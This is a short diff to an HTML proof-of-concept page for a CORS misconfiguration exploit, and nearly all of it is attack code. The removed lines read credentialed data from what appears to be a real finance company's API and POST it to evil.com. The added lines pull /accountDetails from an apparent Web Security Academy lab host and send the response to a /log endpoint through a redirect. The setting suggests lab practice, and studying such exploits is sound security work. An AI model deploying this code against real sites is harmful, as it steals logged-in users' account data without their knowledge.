@@ -8,22 +8,15 @@
 <button type='button' onclick='cors()'>Exploit</button>
 <p id='demo'></p>
 <script>
-function cors() {
-var xhttp = new XMLHttpRequest();
-xhttp.onreadystatechange = function() {
-if (this.readyState == 4 && this.status == 200) {
-var a = this.responseText; // Sensitive data from niche.co about user account
-document.getElementById("demo").innerHTML = a;
-xhttp.open("POST", "http://evil.com", true);// Sending that data to Attacker's website
-xhttp.withCredentials = true;
-console.log(a);
-xhttp.send("data="+a);
-}
-};
-xhttp.open("GET", "https://feonline.fecredit.com.vn/wp-json/", true);
-xhttp.withCredentials = true;
-xhttp.send();
-}
+   var req = new XMLHttpRequest();
+   req.onload = reqListener;
+   req.open('get','https://acc21f651fde5631c03665e000d90048.web-security-academy.net/accountDetails',true);
+   req.withCredentials = true;
+   req.send();
+
+   function reqListener() {
+       location='/log?key='+this.responseText;
+   };
 </script>
 </body>
 </html>
